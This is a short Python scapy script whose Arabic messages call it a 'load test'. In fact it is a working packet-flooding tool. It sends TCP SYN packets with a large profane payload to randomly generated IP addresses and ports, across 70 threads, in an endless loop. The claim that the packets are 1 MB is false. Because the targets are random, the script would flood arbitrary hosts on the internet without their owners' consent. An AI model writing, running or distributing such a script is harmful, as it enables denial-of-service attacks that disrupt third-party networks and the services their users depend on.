import threading
from scapy.all import *
import random
import time

def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_port():
    return random.randint(1024, 65535)

def send_syn_packet(target_ip, target_port):
    payload = Raw(load="fuck" * 1400)
    ip = IP(dst=target_ip)
    syn = TCP(dport=target_port, flags="S", seq=random.randint(1000, 9000))
    packet = ip/syn/payload
    send(packet, verbose=False)

def load_test():
    target_ip = generate_random_ip()
    target_port = generate_random_port()
    print(f"بدأ الاختبار: إرسال حزم بحجم 1 ميجا إلى {target_ip} على المنفذ {target_port}")
    
    for i in range(10):
        send_syn_packet(target_ip, target_port)
        time.sleep(0.2)
    
    print("انتهى الاختبار!")

def Range_Range():
    threads = []
    for i in range(70):
        thread = threading.Thread(target=load_test)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

while True:
	Range_Range()
